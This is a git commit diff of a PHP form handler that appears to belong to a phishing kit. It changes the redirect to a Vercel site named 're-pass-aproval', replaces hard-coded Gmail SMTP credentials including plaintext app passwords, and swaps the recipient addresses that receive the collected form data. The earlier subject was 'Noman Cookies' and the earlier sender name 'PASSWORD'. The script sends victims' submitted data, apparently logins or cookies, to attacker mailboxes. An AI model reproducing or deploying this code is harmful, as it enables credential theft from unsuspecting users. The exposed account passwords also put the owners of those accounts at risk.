b5417de57d6ad0676e6dfd2628e1f0c62c43a652
razanizamani <razanizamani7@gmail.com>
2025-08-11 21:41:34 -0700

    Update and rename noman.php to q.php

--- q.php
+++ q.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://case-cccczqz4cd1pfr008-support.vercel.app/");
+header("Location: https://re-pass-aproval.vercel.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
@@ -27,24 +27,22 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $mail->isSMTP();
         $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'patjckbang@gmail.com'; // Replace with your email address
-        $mail->Password   = 'wqvv rhzu ydia haut'; // Replace with your email password
+        $mail->Username   = 'official.mitchealmartin@gmail.com'; // Replace with your email address
+        $mail->Password   = 'stbi hwua bspu vgiv'; // Replace with your email password
         $mail->SMTPSecure = 'tls';
         $mail->Port       = 587;
 
 
         // Email properties
-        $mail->setFrom('patjckbang@gmail.com', 'PASSWORD');
-        $mail->addAddress('ronnieeamen@gmail.com');
-       $mail->addAddress('uffemail215@gmail.com');
-      $mail->addAddress('asifali.nizamani110@gmail.com');
+        $mail->setFrom('aliumair0044@gmail.com', 'PK');
+        $mail->addAddress('aliumair0044@gmail.com');
 
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'Noman Cookies';
+        $mail->Subject = 'Qasim';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
